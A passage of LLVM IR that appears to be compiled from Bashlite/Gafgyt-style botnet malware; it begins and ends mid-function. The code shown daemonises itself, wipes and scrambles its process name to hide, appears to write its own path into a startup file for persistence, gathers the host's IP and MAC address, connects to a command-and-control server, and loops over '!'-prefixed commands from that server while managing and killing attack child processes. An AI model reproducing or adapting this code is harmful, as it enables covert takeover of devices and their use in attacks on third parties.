  %486 = icmp eq i32 %482, %485
  br i1 %486, label %493, label %487

; <label>:487:                                    ; preds = %484
  %488 = load i32*, i32** @pids, align 8
  %489 = getelementptr inbounds i32, i32* %488, i64 %.0237
  %490 = load i32, i32* %489, align 4
  %491 = tail call i32 @kill(i32 %490, i32 9) #3
  %492 = add nsw i32 %.0195236, 1
  br label %493

; <label>:493:                                    ; preds = %484, %.lr.ph238, %487
  %.1 = phi i32 [ %492, %487 ], [ %.0195236, %484 ], [ %.0195236, %.lr.ph238 ]
  %494 = add i64 %.0237, 1
  %495 = load i32, i32* @numpids, align 4
  %496 = sext i32 %495 to i64
  %497 = icmp ult i64 %494, %496
  br i1 %497, label %.lr.ph238, label %._crit_edge239

._crit_edge239:                                   ; preds = %493
  %498 = icmp sgt i32 %.1, 0
  %499 = load i32, i32* @mainCommSock, align 4
  br i1 %498, label %500, label %502

; <label>:500:                                    ; preds = %._crit_edge239
  %501 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %499, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.471, i64 0, i64 0), i32 %.1)
  br label %505

; <label>:502:                                    ; preds = %._crit_edge239.thread, %._crit_edge239
  %503 = phi i32 [ %479, %._crit_edge239.thread ], [ %499, %._crit_edge239 ]
  %504 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %503, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.472, i64 0, i64 0))
  br label %505

; <label>:505:                                    ; preds = %.loopexit221, %500, %502
  %506 = load i8*, i8** %1, align 8
  %507 = tail call i32 @strcmp(i8* %506, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.473, i64 0, i64 0)) #15
  %508 = icmp eq i32 %507, 0
  br i1 %508, label %509, label %.loopexit

; <label>:509:                                    ; preds = %505
  tail call void @exit(i32 0) #17
  unreachable

.loopexit.loopexit:                               ; preds = %.preheader
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %505, %470, %438, %406, %300, %191, %78, %87, %67, %457, %420, %391, %272, %230, %152, %112, %86, %56, %49, %43
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i64 @sysconf(i32) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 4096, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #3
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @cncServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #3
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #15
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #15
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 23, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.474, i64 0, i64 0)) #3
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #18
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #3
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #3
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.475, i64 0, i64 0), i32 0) #3
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit18, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.476, i64 0, i64 0)) #15
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.016 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.016, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.016, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.016, align 1
  br label %.loopexit18

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit18.loopexit, label %.lr.ph

.loopexit18.loopexit:                             ; preds = %36
  br label %.loopexit18

.loopexit18:                                      ; preds = %.loopexit18.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #3
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit18
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #3
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #3
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep21 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep21, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit18
  %45 = call i32 @close(i32 %6) #3
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getBuild() local_unnamed_addr #14 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.477, i64 0, i64 0)
}

; Function Attrs: noinline nounwind uwtable
define void @makeFukdString(i8* nocapture, i32) local_unnamed_addr #1 {
  %3 = tail call i64 @time(i64* null) #3
  %4 = trunc i64 %3 to i32
  tail call void @srand(i32 %4) #3
  %5 = icmp sgt i32 %1, 0
  br i1 %5, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %6 = tail call i32 @rand() #3
  %7 = srem i32 %6, 223
  %8 = add nsw i32 %7, 33
  %9 = trunc i32 %8 to i8
  %10 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %9, i8* %10, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @touchMyself(i8** nocapture readonly) local_unnamed_addr #1 {
  %2 = tail call i32 @fork() #3
  %3 = icmp eq i32 %2, 0
  br i1 %3, label %.preheader.preheader, label %9

.preheader.preheader:                             ; preds = %1
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %4 = load i8*, i8** %0, align 8
  %5 = tail call i32 @rand() #3
  %6 = srem i32 %5, 128
  %7 = add nsw i32 %6, 1024
  tail call void @makeFukdString(i8* %4, i32 %7)
  %8 = tail call i32 @sleep(i32 3) #3
  br label %.preheader

; <label>:9:                                      ; preds = %1
  ret void
}

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8**) local_unnamed_addr #12 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  %5 = alloca [256 x i8], align 16
  %6 = alloca [256 x i8], align 16
  %7 = alloca [1024 x i8], align 16
  %8 = alloca [4096 x i8], align 16
  %9 = alloca [1024 x i8], align 16
  %10 = alloca [10 x i8*], align 16
  store i8** %1, i8*** %3, align 8
  %puts = tail call i32 @puts(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @str, i64 0, i64 0))
  %11 = tail call i32 @getpid() #3
  store i32 %11, i32* @actualparent, align 4
  %12 = tail call i32 @fork() #3
  %13 = icmp slt i32 %12, 0
  br i1 %13, label %14, label %15

; <label>:14:                                     ; preds = %2
  tail call void @exit(i32 1) #17
  unreachable

; <label>:15:                                     ; preds = %2
  %16 = icmp eq i32 %12, 0
  br i1 %16, label %18, label %17

; <label>:17:                                     ; preds = %15
  tail call void @exit(i32 0) #17
  unreachable

; <label>:18:                                     ; preds = %15
  %19 = tail call i32 (i32, ...) bitcast (i32 (...)* @umask to i32 (i32, ...)*)(i32 0) #3
  %20 = tail call i32 @setsid() #3
  %21 = icmp slt i32 %20, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %18
  tail call void @exit(i32 1) #17
  unreachable

; <label>:23:                                     ; preds = %18
  %24 = tail call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i64 0, i64 0)) #3
  %25 = tail call i32 @close(i32 0) #3
  %26 = tail call i32 @close(i32 1) #3
  %27 = tail call i32 @close(i32 2) #3
  %28 = bitcast i8*** %3 to i8**
  call void @touchMyself(i8** nonnull %28)
  %29 = load i8**, i8*** %3, align 8
  %30 = load i8*, i8** %29, align 8
  %31 = tail call i64 @strlen(i8* %30) #15
  tail call void @llvm.memset.p0i8.i64(i8* %30, i8 0, i64 %31, i32 1, i1 false)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i64 0, i64 0), i8** %29, align 8
  %32 = tail call i64 @time(i64* null) #3
  %33 = tail call i32 @getpid() #3
  %34 = zext i32 %33 to i64
  %35 = xor i64 %34, %32
  %36 = trunc i64 %35 to i32
  tail call void @srand(i32 %36) #3
  %37 = tail call i64 @time(i64* null) #3
  %38 = tail call i32 @getpid() #3
  %39 = zext i32 %38 to i64
  %40 = xor i64 %39, %37
  %41 = trunc i64 %40 to i32
  tail call void @init_rand(i32 %41)
  %42 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.480, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i64 0, i64 0))
  %43 = icmp eq %struct._IO_FILE* %42, null
  br i1 %43, label %44, label %.thread

; <label>:44:                                     ; preds = %23
  %45 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.481, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i64 0, i64 0))
  %46 = icmp eq %struct._IO_FILE* %45, null
  br i1 %46, label %85, label %.thread

.thread:                                          ; preds = %23, %44
  %.092102 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @.str.481, i64 0, i64 0), %44 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @.str.480, i64 0, i64 0), %23 ]
  %.095101 = phi %struct._IO_FILE* [ %45, %44 ], [ %42, %23 ]
  %47 = load i8**, i8*** %3, align 8
  %48 = load i8*, i8** %47, align 8
  %49 = tail call i64 @strlen(i8* %48) #15
  %50 = getelementptr inbounds [256 x i8], [256 x i8]* %5, i64 0, i64 0
  %51 = call i8* @getcwd(i8* nonnull %50, i64 256) #3
  %52 = call i32 @strcmp(i8* nonnull %50, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i64 0, i64 0)) #15
  %53 = icmp eq i32 %52, 0
  br i1 %53, label %83, label %.preheader110

.preheader110:                                    ; preds = %.thread
  %54 = load i8**, i8*** %3, align 8
  %55 = load i8*, i8** %54, align 8
  %sext = shl i64 %49, 32
  %56 = ashr exact i64 %sext, 32
  br label %57

; <label>:57:                                     ; preds = %57, %.preheader110
  %indvars.iv156 = phi i64 [ %indvars.iv.next157, %57 ], [ %56, %.preheader110 ]
  %58 = getelementptr inbounds i8, i8* %55, i64 %indvars.iv156
  %59 = load i8, i8* %58, align 1
  %60 = icmp eq i8 %59, 47
  %indvars.iv.next157 = add i64 %indvars.iv156, -1
  br i1 %60, label %61, label %57

; <label>:61:                                     ; preds = %57
  %62 = getelementptr inbounds [256 x i8], [256 x i8]* %6, i64 0, i64 0
  %63 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %62, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.482, i64 0, i64 0), i8* nonnull %50, i8* %58) #3
  %64 = call i32 @feof(%struct._IO_FILE* nonnull %.095101) #3
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %.lr.ph143, label %._crit_edge144.thread

._crit_edge144.thread:                            ; preds = %61
  %66 = call i32 @fclose(%struct._IO_FILE* nonnull %.095101)
  br label %77

.lr.ph143:                                        ; preds = %61
  %67 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  br label %68

; <label>:68:                                     ; preds = %.lr.ph143, %68
  %.093141 = phi i32 [ 0, %.lr.ph143 ], [ %..093, %68 ]
  %69 = call i8* @fgets(i8* nonnull %67, i32 1024, %struct._IO_FILE* nonnull %.095101)
  %70 = call i32 @strcasecmp(i8* nonnull %67, i8* nonnull %62) #15
  %71 = icmp eq i32 %70, 0
  %72 = zext i1 %71 to i32
  %..093 = add nsw i32 %72, %.093141
  %73 = call i32 @feof(%struct._IO_FILE* nonnull %.095101) #3
  %74 = icmp eq i32 %73, 0
  br i1 %74, label %68, label %._crit_edge144

._crit_edge144:                                   ; preds = %68
  %75 = icmp eq i32 %..093, 0
  %76 = call i32 @fclose(%struct._IO_FILE* nonnull %.095101)
  br i1 %75, label %77, label %85

; <label>:77:                                     ; preds = %._crit_edge144.thread, %._crit_edge144
  %78 = call %struct._IO_FILE* @fopen(i8* %.092102, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.483, i64 0, i64 0))
  %79 = icmp eq %struct._IO_FILE* %78, null
  br i1 %79, label %85, label %80

; <label>:80:                                     ; preds = %77
  %81 = call i32 @fputs(i8* nonnull %62, %struct._IO_FILE* nonnull %78)
  %82 = call i32 @fclose(%struct._IO_FILE* nonnull %78)
  br label %85

; <label>:83:                                     ; preds = %.thread
  %84 = call i32 @fclose(%struct._IO_FILE* nonnull %.095101)
  br label %85

; <label>:85:                                     ; preds = %77, %44, %83, %._crit_edge144, %80
  %86 = call i32 @getOurIP()
  %87 = call i32 @fork() #3
  %88 = icmp eq i32 %87, 0
  br i1 %88, label %91, label %89

; <label>:89:                                     ; preds = %85
  %90 = call i32 @waitpid(i32 %87, i32* nonnull %4, i32 0) #3
  call void @exit(i32 0) #17
  unreachable

; <label>:91:                                     ; preds = %85
  %92 = call i32 @fork() #3
  %93 = icmp eq i32 %92, 0
  br i1 %93, label %95, label %94

; <label>:94:                                     ; preds = %91
  call void @exit(i32 0) #17
  unreachable

; <label>:95:                                     ; preds = %91
  %96 = call i32 @setsid() #3
  %97 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i64 0, i64 0)) #3
  %98 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  %99 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %100 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 1
  %101 = getelementptr inbounds [10 x i8*], [10 x i8*]* %10, i64 0, i64 0
  br label %.outer

.outer:                                           ; preds = %172, %95
  %.090.ph = phi i32 [ %173, %172 ], [ 0, %95 ]
  br label %.backedge109

.backedge109.loopexit:                            ; preds = %.backedge
  br label %.backedge109.backedge

.backedge109:                                     ; preds = %.backedge109.backedge, %.outer
  %102 = call i32 @initConnection()
  %103 = icmp eq i32 %102, 0
  br i1 %103, label %106, label %104

; <label>:104:                                    ; preds = %.backedge109
  %105 = call i32 @sleep(i32 30) #3
  br label %.backedge109.backedge

; <label>:106:                                    ; preds = %.backedge109
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %109 = call i8* @inet_ntoa(i32 %108) #3
  %110 = call i32 (i32, i8*, ...) @sockprintf(i32 %107, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.485, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.477, i64 0, i64 0), i8* %109)
  %111 = load i32, i32* @mainCommSock, align 4
  %112 = call i32 @recvLine(i32 %111, i8* nonnull %99, i32 4096)
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %.backedge109.backedge, label %.preheader107.preheader

.backedge109.backedge:                            ; preds = %106, %104, %.backedge109.loopexit
  br label %.backedge109

.preheader107.preheader:                          ; preds = %106
  br label %.preheader107

.preheader107:                                    ; preds = %.preheader107.preheader, %.backedge
  %114 = phi i32 [ %169, %.backedge ], [ %112, %.preheader107.preheader ]
  %115 = load i32, i32* @numpids, align 4
  %116 = icmp sgt i32 %115, 0
  br i1 %116, label %.lr.ph127.preheader, label %._crit_edge128

.lr.ph127.preheader:                              ; preds = %.preheader107
  br label %.lr.ph127

.lr.ph127:                                        ; preds = %.lr.ph127.preheader, %159
  %indvars.iv = phi i64 [ %indvars.iv.next, %159 ], [ 0, %.lr.ph127.preheader ]
  %117 = load i32*, i32** @pids, align 8
  %118 = getelementptr inbounds i32, i32* %117, i64 %indvars.iv
  %119 = load i32, i32* %118, align 4
  %120 = call i32 @waitpid(i32 %119, i32* null, i32 1) #3
  %121 = icmp sgt i32 %120, 0
  br i1 %121, label %.preheader, label %159

.preheader:                                       ; preds = %.lr.ph127
  %122 = add nuw nsw i64 %indvars.iv, 1
  %123 = load i32, i32* @numpids, align 4
  %124 = zext i32 %123 to i64
  %125 = icmp ult i64 %122, %124
  %126 = load i32*, i32** @pids, align 8
  %127 = trunc i64 %indvars.iv to i32
  br i1 %125, label %.lr.ph118.preheader, label %._crit_edge119

.lr.ph118.preheader:                              ; preds = %.preheader
  %128 = trunc i64 %122 to i32
  %129 = trunc i64 %indvars.iv to i32
  br label %.lr.ph118

.lr.ph118:                                        ; preds = %.lr.ph118.preheader, %.lr.ph118
  %130 = phi i32* [ %138, %.lr.ph118 ], [ %126, %.lr.ph118.preheader ]
  %.088117 = phi i32 [ %.088, %.lr.ph118 ], [ %128, %.lr.ph118.preheader ]
  %.088.in116 = phi i32 [ %.088117, %.lr.ph118 ], [ %129, %.lr.ph118.preheader ]
  %131 = zext i32 %.088117 to i64
  %132 = getelementptr inbounds i32, i32* %130, i64 %131
  %133 = load i32, i32* %132, align 4
  %134 = zext i32 %.088.in116 to i64
  %135 = getelementptr inbounds i32, i32* %130, i64 %134
  store i32 %133, i32* %135, align 4
  %.088 = add i32 %.088117, 1
  %136 = load i32, i32* @numpids, align 4
  %137 = icmp ult i32 %.088, %136
  %138 = load i32*, i32** @pids, align 8
  br i1 %137, label %.lr.ph118, label %._crit_edge119.loopexit

._crit_edge119.loopexit:                          ; preds = %.lr.ph118
  br label %._crit_edge119

._crit_edge119:                                   ; preds = %._crit_edge119.loopexit, %.preheader
  %.088.in.lcssa = phi i32 [ %127, %.preheader ], [ %.088117, %._crit_edge119.loopexit ]
  %.lcssa = phi i32* [ %126, %.preheader ], [ %138, %._crit_edge119.loopexit ]
  %139 = zext i32 %.088.in.lcssa to i64
  %140 = getelementptr inbounds i32, i32* %.lcssa, i64 %139
  store i32 0, i32* %140, align 4
  %141 = load i32, i32* @numpids, align 4
  %142 = add nsw i32 %141, -1
  store i32 %142, i32* @numpids, align 4
  %143 = sext i32 %141 to i64
  %144 = shl nsw i64 %143, 2
  %145 = call noalias i8* @malloc(i64 %144) #3
  %146 = bitcast i8* %145 to i32*
  %147 = icmp eq i32 %142, 0
  %148 = load i32*, i32** @pids, align 8
  br i1 %147, label %._crit_edge124, label %.lr.ph123.preheader

.lr.ph123.preheader:                              ; preds = %._crit_edge119
  br label %.lr.ph123

.lr.ph123:                                        ; preds = %.lr.ph123.preheader, %.lr.ph123
  %149 = phi i32* [ %157, %.lr.ph123 ], [ %148, %.lr.ph123.preheader ]
  %.189121 = phi i32 [ %154, %.lr.ph123 ], [ 0, %.lr.ph123.preheader ]
  %150 = zext i32 %.189121 to i64
  %151 = getelementptr inbounds i32, i32* %149, i64 %150
  %152 = load i32, i32* %151, align 4
  %153 = getelementptr inbounds i32, i32* %146, i64 %150
  store i32 %152, i32* %153, align 4
  %154 = add i32 %.189121, 1
  %155 = load i32, i32* @numpids, align 4
  %156 = icmp ult i32 %154, %155
  %157 = load i32*, i32** @pids, align 8
  br i1 %156, label %.lr.ph123, label %._crit_edge124.loopexit

._crit_edge124.loopexit:                          ; preds = %.lr.ph123
  br label %._crit_edge124

._crit_edge124:                                   ; preds = %._crit_edge124.loopexit, %._crit_edge119
  %.lcssa111 = phi i32* [ %148, %._crit_edge119 ], [ %157, %._crit_edge124.loopexit ]
  %158 = bitcast i32* %.lcssa111 to i8*
  call void @free(i8* %158) #3
  store i8* %145, i8** bitcast (i32** @pids to i8**), align 8
  br label %159

; <label>:159:                                    ; preds = %.lr.ph127, %._crit_edge124
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %160 = load i32, i32* @numpids, align 4
  %161 = sext i32 %160 to i64
  %162 = icmp slt i64 %indvars.iv.next, %161
  br i1 %162, label %.lr.ph127, label %._crit_edge128.loopexit

._crit_edge128.loopexit:                          ; preds = %159
  br label %._crit_edge128

._crit_edge128:                                   ; preds = %._crit_edge128.loopexit, %.preheader107
  %163 = sext i32 %114 to i64
  %164 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 %163
  store i8 0, i8* %164, align 1
  call void @trim(i8* nonnull %99)
  %strncmp = call i32 @strncmp(i8* nonnull %99, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %165, label %171

; <label>:165:                                    ; preds = %._crit_edge128
  %166 = load i32, i32* @mainCommSock, align 4
  %167 = call i32 (i32, i8*, ...) @sockprintf(i32 %166, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.486, i64 0, i64 0))
  br label %.backedge

.backedge.loopexit:                               ; preds = %.lr.ph140
  br label %.backedge

.backedge.loopexit170:                            ; preds = %.preheader146
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit170, %.backedge.loopexit, %._crit_edge137.thread, %165, %._crit_edge137, %177, %209
  %168 = load i32, i32* @mainCommSock, align 4
  %169 = call i32 @recvLine(i32 %168, i8* nonnull %99, i32 4096)
  %170 = icmp eq i32 %169, -1
  br i1 %170, label %.backedge109.loopexit, label %.preheader107

; <label>:171:                                    ; preds = %._crit_edge128
  %strncmp97 = call i32 @strncmp(i8* nonnull %99, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.487, i64 0, i64 0), i64 3)
  %cmp98 = icmp eq i32 %strncmp97, 0
  br i1 %cmp98, label %172, label %177

; <label>:172:                                    ; preds = %171
  %173 = add nuw nsw i32 %.090.ph, 1
  %174 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.488, i64 0, i64 0))
  %175 = icmp sgt i32 %.090.ph, 19
  br i1 %175, label %176, label %.outer

; <label>:176:                                    ; preds = %172
  call void @exit(i32 0) #17
  unreachable

; <label>:177:                                    ; preds = %171
  %178 = load i8, i8* %99, align 16
  %179 = icmp eq i8 %178, 33
  br i1 %179, label %.preheader146.preheader, label %.backedge

.preheader146.preheader:                          ; preds = %177
  br label %.preheader146

.preheader146:                                    ; preds = %.preheader146.preheader, %181
  %.086 = phi i8* [ %182, %181 ], [ %100, %.preheader146.preheader ]
  %180 = load i8, i8* %.086, align 1
  switch i8 %180, label %181 [
    i8 0, label %.backedge.loopexit170
    i8 32, label %183
  ]

; <label>:181:                                    ; preds = %.preheader146
  %182 = getelementptr inbounds i8, i8* %.086, i64 1
  br label %.preheader146

; <label>:183:                                    ; preds = %.preheader146
  store i8 0, i8* %.086, align 1
  %184 = call i64 @strlen(i8* %100) #15
  %185 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 %184
  %186 = getelementptr inbounds i8, i8* %185, i64 2
  br label %187

; <label>:187:                                    ; preds = %192, %183
  %188 = call i64 @strlen(i8* %186) #15
  %189 = add i64 %188, -1
  %190 = getelementptr inbounds i8, i8* %186, i64 %189
  %191 = load i8, i8* %190, align 1
  switch i8 %191, label %.preheader105.preheader [
    i8 13, label %192
    i8 10, label %192
  ]

.preheader105.preheader:                          ; preds = %187
  br label %.preheader105

; <label>:192:                                    ; preds = %187, %187
  store i8 0, i8* %190, align 1
  br label %187

.preheader105:                                    ; preds = %.preheader105.preheader, %194
  %.087 = phi i8* [ %195, %194 ], [ %186, %.preheader105.preheader ]
  %193 = load i8, i8* %.087, align 1
  switch i8 %193, label %194 [
    i8 32, label %196
    i8 0, label %196
  ]

; <label>:194:                                    ; preds = %.preheader105
  %195 = getelementptr inbounds i8, i8* %.087, i64 1
  br label %.preheader105

; <label>:196:                                    ; preds = %.preheader105, %.preheader105
  store i8 0, i8* %.087, align 1
  %197 = getelementptr inbounds i8, i8* %.087, i64 1
  %198 = load i8, i8* %186, align 1
  %199 = icmp eq i8 %198, 0
  br i1 %199, label %._crit_edge132, label %.lr.ph131.preheader

.lr.ph131.preheader:                              ; preds = %196
  br label %.lr.ph131

.lr.ph131:                                        ; preds = %.lr.ph131.preheader, %.lr.ph131
  %200 = phi i8 [ %205, %.lr.ph131 ], [ %198, %.lr.ph131.preheader ]
  %.085129 = phi i8* [ %204, %.lr.ph131 ], [ %186, %.lr.ph131.preheader ]
  %201 = zext i8 %200 to i32
  %202 = call i32 @toupper(i32 %201) #15
  %203 = trunc i32 %202 to i8
  store i8 %203, i8* %.085129, align 1
  %204 = getelementptr inbounds i8, i8* %.085129, i64 1
  %205 = load i8, i8* %204, align 1
